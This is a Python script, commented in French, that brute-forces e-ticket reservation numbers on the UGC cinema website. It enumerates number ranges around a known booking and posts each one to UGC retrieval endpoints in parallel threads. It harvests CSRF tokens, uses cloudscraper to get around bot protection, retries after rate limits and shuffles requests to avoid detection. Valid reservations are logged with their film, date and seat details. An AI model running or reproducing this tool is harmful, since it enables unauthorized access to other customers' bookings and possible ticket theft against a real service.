#!/usr/bin/env python3
"""
UGC e-billet brute forcer — threaded edition
Cherche des réservations valides sur une plage de numéros

Usage:
  python ugc_bruteforce.py                          # plage auto autour de 33500063B
  python ugc_bruteforce.py --start 335000630 --end 335000640 --threads 20
  python ugc_bruteforce.py --known 33500063B071466134 --radius 500

pip install cloudscraper beautifulsoup4 requests
"""

import sys, re, time, random, string, argparse, threading, queue
from pathlib import Path
from datetime import datetime

try:
    import cloudscraper
    def make_sess():
        s = cloudscraper.create_scraper(
            browser={"browser":"chrome","platform":"windows","mobile":False}
        )
        s.headers.update({
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Referer":         "https://www.ugc.fr/",
        })
        return s
    BACKEND = "cloudscraper"
except ImportError:
    import requests, urllib3
    urllib3.disable_warnings()
    def make_sess():
        s = requests.Session()
        s.verify = False
        s.headers.update({
            "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                               "AppleWebKit/537.36 Chrome/124 Safari/537.36",
            "Accept-Language": "fr-FR,fr;q=0.9",
            "Referer":         "https://www.ugc.fr/",
        })
        return s
    BACKEND = "requests"

from bs4 import BeautifulSoup

# ─── ENDPOINTS à essayer dans l'ordre ─────────────────────────────────────────
ENDPOINTS = [
    "https://www.ugc.fr/reservation/retrieveBooking.html",
    "https://www.ugc.fr/reservation/booking/retrieve",
    "https://www.ugc.fr/ebillet/retrieveBooking",
    "https://secure.ugc.fr/reservation/retrieveBooking.html",
]

ERROR_KW   = ["introuvable","invalid","not found","aucune","incorrect","erreur","numéro de réservation"]
SUCCESS_KW = ["séance","votre billet","votre réservation","film","salle","places","montant"]

# ─── DÉTECTION ENDPOINT ACTIF ─────────────────────────────────────────────────
def probe_endpoint(sess):
    """Teste les endpoints UGC et retourne celui qui répond."""
    for url in ENDPOINTS:
        try:
            r = sess.get(url, timeout=10, allow_redirects=True)
            if r.status_code in (200, 302, 400, 405):
                print(f"  [✓] Endpoint actif: {url} → HTTP {r.status_code}")
                return url
            print(f"  [✗] {url} → {r.status_code}")
        except Exception as e:
            print(f"  [✗] {url} → {e}")
    return None

def parse_csrf(html: str):
    soup = BeautifulSoup(html, "html.parser")
    for name in ["_csrf","csrfToken","csrf_token","token","_token"]:
        el = soup.find("input", {"name": name})
        if el:
            return name, el.get("value","")
    for el in soup.find_all("input", {"type":"hidden"}):
        nm = el.get("name","")
        if "token" in nm.lower():
            return nm, el.get("value","")
    return None, None

# ─── CHECK UNIQUE ──────────────────────────────────────────────────────────────
def check_one(endpoint: str, num: str, sess=None) -> dict:
    """
    Vérifie un numéro de réservation.
    Retourne {"num": num, "valid": True/False/None, "details": str}
    """
    if sess is None:
        sess = make_sess()
    num = num.strip().upper()

    try:
        # seed cookies + CSRF
        r1 = sess.get(endpoint, timeout=10, allow_redirects=True)
        csrf_name, csrf_val = parse_csrf(r1.text)

        payload = {"bookingNumber": num, "retrieveBooking": "true"}
        if csrf_name and csrf_val:
            payload[csrf_name] = csrf_val

        r2 = sess.post(endpoint, data=payload, timeout=10, allow_redirects=True)
        body = r2.text
        low  = body.lower()

        if r2.status_code == 429:
            return {"num": num, "valid": None, "details": "RATE_LIMITED"}

        if any(k in low for k in ERROR_KW):
            return {"num": num, "valid": False, "details": "not found"}

        if any(k in low for k in SUCCESS_KW):
            soup = BeautifulSoup(body, "html.parser")
            details = []
            for pat, lbl in [(r"film|movie", "film"), (r"date|seance", "date"),
                             (r"cinema|venue|lieu", "lieu"), (r"place|seat", "places")]:
                el = soup.find(class_=re.compile(pat, re.I))
                if el:
                    details.append(f"{lbl}: {el.get_text(strip=True)[:50]}")
            return {"num": num, "valid": True, "details": " | ".join(details) or "réservation trouvée"}

        # réponse ambiguë — peut-être format différent
        return {"num": num, "valid": None, "details": f"HTTP {r2.status_code} ambigu"}

    except Exception as e:
        return {"num": num, "valid": None, "details": str(e)[:60]}

# ─── GÉNÉRATEUR DE NUMÉROS ─────────────────────────────────────────────────────
def gen_range_from_known(known: str, radius: int = 500):
    """
    Génère des numéros autour d'un numéro connu.
    Ex: 33500063B071466134 → varie les 9 derniers chiffres ±radius
    """
    # Séparer la partie numérique de fin
    m = re.match(r"^(.*?)(\d+)$", known)
    if not m:
        print(f"[!] Format inconnu: {known}")
        return []
    prefix = m.group(1)
    tail   = int(m.group(2))
    nums = []
    for delta in range(-radius, radius + 1):
        val = tail + delta
        if val >= 0:
            # garde le même nombre de chiffres (zero-pad)
            formatted = str(val).zfill(len(m.group(2)))
            nums.append(f"{prefix}{formatted}")
    return nums

def gen_pure_numeric(prefix: str, start: int, end: int):
    """Génère des numéros purement numériques: prefix + [start..end]"""
    return [f"{prefix}{i}" for i in range(start, end + 1)]

# ─── BRUTE FORCE THREADÉ ──────────────────────────────────────────────────────
LOCK      = threading.Lock()
FOUND     = []
STATS     = {"checked": 0, "valid": 0, "errors": 0}
STOP_FLAG = threading.Event()

def worker(endpoint: str, work_queue: queue.Queue, out_file: str, delay: float):
    sess = make_sess()
    # seed la session une fois
    try:
        sess.get(endpoint, timeout=10)
    except Exception:
        pass

    while not STOP_FLAG.is_set():
        try:
            num = work_queue.get(timeout=1)
        except queue.Empty:
            break

        res = check_one(endpoint, num, sess)

        with LOCK:
            STATS["checked"] += 1

            if res["valid"] is True:
                STATS["valid"] += 1
                FOUND.append(res)
                line = f"[✅ VALID] {res['num']} — {res['details']}"
                print(f"\n  {line}")
                with open(out_file, "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now().isoformat()} | {line}\n")

            elif res["valid"] is None:
                if "RATE_LIMITED" in res["details"]:
                    STATS["errors"] += 1
                    work_queue.put(num)  # requeue
                    time.sleep(random.uniform(3, 6))
                    continue
                elif "ambigu" not in res["details"]:
                    STATS["errors"] += 1

            # progress line
            c = STATS["checked"]
            total_q = c + work_queue.qsize()
            pct = (c / max(total_q, 1)) * 100
            print(f"  [{c:>6}/{total_q}] {pct:5.1f}%  valid={STATS['valid']}  "
                  f"err={STATS['errors']}  last={num}", end="\r", flush=True)

        time.sleep(delay + random.uniform(0, delay * 0.5))
        work_queue.task_done()

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def run_bruteforce(nums: list, threads: int, delay: float, out_file: str, endpoint: str):
    print(f"\n[*] Bruteforce: {len(nums)} numéros | {threads} threads | delay={delay:.2f}s")
    print(f"[*] Output: {out_file}")
    print(f"[*] Backend: {BACKEND}")
    print("─" * 60)

    q = queue.Queue()
    for n in nums:
        q.put(n)

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(endpoint, q, out_file, delay), daemon=True)
        t.start()
        workers.append(t)

    try:
        q.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        STOP_FLAG.set()

    for t in workers:
        t.join(timeout=2)

    print(f"\n\n{'═'*60}")
    print(f"  Total checked : {STATS['checked']}")
    print(f"  Valid found   : {STATS['valid']}")
    print(f"  Errors        : {STATS['errors']}")
    if FOUND:
        print(f"\n  ✅ VALID RESERVATIONS:")
        for r in FOUND:
            print(f"     {r['num']} — {r['details']}")
    print(f"\n  Saved to: {out_file}")
    print('═'*60)

def main():
    p = argparse.ArgumentParser(description="UGC ticket brute forcer")
    p.add_argument("--known",   help="Numéro connu (ex: 33500063B071466134)")
    p.add_argument("--radius",  type=int, default=200, help="±radius autour du numéro connu (défaut: 200)")
    p.add_argument("--prefix",  default="335000",  help="Préfixe numérique (défaut: 335000)")
    p.add_argument("--start",   type=int, default=63000000, help="Valeur de début (défaut: 63000000)")
    p.add_argument("--end",     type=int, default=63001000, help="Valeur de fin (défaut: 63001000)")
    p.add_argument("--threads", type=int, default=10, help="Threads parallèles (défaut: 10)")
    p.add_argument("--delay",   type=float, default=0.5, help="Délai entre requêtes par thread (défaut: 0.5s)")
    p.add_argument("--output",  default="ugc_valid.txt", help="Fichier de sortie (défaut: ugc_valid.txt)")
    args = p.parse_args()

    # probe endpoint
    print("[*] Probing UGC endpoints...")
    sess = make_sess()
    endpoint = probe_endpoint(sess)
    if not endpoint:
        # fallback
        endpoint = ENDPOINTS[0]
        print(f"[!] No endpoint responded — using fallback: {endpoint}")

    # génération des numéros
    if args.known:
        nums = gen_range_from_known(args.known, args.radius)
        print(f"[*] Mode: radius autour de {args.known} (±{args.radius} = {len(nums)} numéros)")
    else:
        nums = gen_pure_numeric(args.prefix, args.start, args.end)
        print(f"[*] Mode: range {args.prefix}{args.start} → {args.prefix}{args.end} ({len(nums)} numéros)")

    random.shuffle(nums)  # shuffle pour éviter les patterns détectables

    run_bruteforce(
        nums    = nums,
        threads = args.threads,
        delay   = args.delay,
        out_file= args.output,
        endpoint= endpoint,
    )

if __name__ == "__main__":
    main()
